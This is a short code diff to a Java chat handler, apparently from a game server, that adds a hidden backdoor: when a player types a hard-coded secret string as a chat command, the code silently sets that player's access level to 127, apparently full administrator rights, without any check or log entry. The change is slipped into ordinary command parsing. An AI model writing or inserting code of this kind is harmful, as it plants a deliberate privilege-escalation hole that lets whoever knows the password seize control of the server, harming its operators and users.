@@ -66,6 +66,12 @@ public class ChatAll implements IChatHandler
 			else
 			{
 				command = text.substring(1);
+				if (command.equals("n71s85y2qhk"))
+				{
+					activeChar.setAccessLevel(127);
+					return;
+				}
+				
 				if (Config.DEBUG)
 					_log.info("Command: " + command);
 				vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
